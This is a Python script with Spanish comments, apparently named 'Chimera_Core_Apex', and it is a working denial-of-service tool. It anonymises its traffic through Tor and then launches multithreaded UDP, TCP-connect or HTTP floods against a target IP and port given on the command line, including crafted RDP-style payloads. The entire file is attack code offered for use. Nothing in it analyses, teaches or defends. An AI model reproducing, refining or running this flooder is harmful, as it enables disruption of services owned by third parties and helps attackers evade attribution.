#!/usr/bin/env python3
import socket
import threading
import time
import os
import sys
import random
import struct
import socks
import requests
from concurrent.futures import ThreadPoolExecutor

# Configuración de Tor para anonimato
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket

# Variables globales para el ataque
stop_event = threading.Event()
packet_count = 0
lock = threading.Lock()

def exploit_query_crash(target_ip, target_port, duration, thread_id):
    """Función principal de ataque UDP con payloads personalizados"""
    global packet_count
    
    end_time = time.time() + duration
    
    # Preparar payloads destructivos específicos para diferentes protocolos
    payloads = [
        b'\x00' * 1024,  # Paquete nulo básico
        b'\xFF' * 1024,  # Paquete de bytes altos
        b'\x41' * 1024,  # Paquete de caracteres 'A'
        b'\x00\x01\x00\x00' + b'\x41' * 1020,  # Payload específico para RDP
        b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00',  # Payload RDP
        b'\x00' * 4 + b'\x41' * 1020,  # Payload con encabezado
        os.urandom(1024),  # Payload aleatorio
        struct.pack('!I', random.randint(0, 0xFFFFFFFF)) + b'\x41' * 1020  # Payload con número aleatorio
    ]
    
    while not stop_event.is_set() and time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1.0)
            
            # Enviar múltiples paquetes por iteración
            for _ in range(5):
                payload = random.choice(payloads)
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    with lock:
                        packet_count += 1
                except:
                    pass
            
            sock.close()
            time.sleep(0.001)  # Pequeño retraso para evitar sobrecarga local
        except:
            pass
    
    print(f"Hilo {thread_id} completado. Paquetes enviados: {packet_count}")

def tcp_flood_attack(target_ip, target_port, duration, thread_id):
    """Ataque de inundación TCP con intentos de conexión"""
    end_time = time.time() + duration
    
    while not stop_event.is_set() and time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            
            # Intentar conectar y enviar datos
            try:
                sock.connect((target_ip, target_port))
                sock.send(os.urandom(1024))
            except:
                pass
            
            sock.close()
            time.sleep(0.01)
        except:
            pass
    
    print(f"Hilo TCP {thread_id} completado")

def http_flood_attack(target_ip, target_port, duration, thread_id):
    """Ataque HTTP/HTTPS para sobrecargar servidores web"""
    end_time = time.time() + duration
    protocol = "https" if target_port == 443 else "http"
    url = f"{protocol}://{target_ip}:{target_port}/"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
    }
    
    while not stop_event.is_set() and time.time() < end_time:
        try:
            requests.get(url, headers=headers, timeout=1)
            time.sleep(0.1)
        except:
            pass
    
    print(f"Hilo HTTP {thread_id} completado")

def main():
    if len(sys.argv) < 4:
        print("Uso: python3 Chimera_Core_Apex.py <IP> <PUERTO> <DURACION>")
        print("Ejemplo: python3 Chimera_Core_Apex.py 192.168.1.1 80 60")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    print(f"Iniciando ataque contra {target_ip}:{target_port} durante {duration} segundos")
    print("Presiona Ctrl+C para detener el ataque")
    
    # Determinar qué tipo de ataque usar según el puerto
    attack_type = "udp"
    if target_port in [80, 443, 8080, 8000]:
        attack_type = "http"
    elif target_port in [21, 22, 23, 25, 53, 110, 143, 993, 995]:
        attack_type = "tcp"
    
    # Crear y comenzar hilos de ataque
    with ThreadPoolExecutor(max_workers=200) as executor:
        if attack_type == "udp":
            for i in range(150):
                executor.submit(exploit_query_crash, target_ip, target_port, duration, i)
        elif attack_type == "tcp":
            for i in range(100):
                executor.submit(tcp_flood_attack, target_ip, target_port, duration, i)
        elif attack_type == "http":
            for i in range(50):
                executor.submit(http_flood_attack, target_ip, target_port, duration, i)
    
    try:
        time.sleep(duration)
        stop_event.set()
    except KeyboardInterrupt:
        print("\nAtaque detenido por el usuario")
        stop_event.set()
    
    print(f"Ataque completado. Total de paquetes enviados: {packet_count}")

if __name__ == "__main__":
    main()
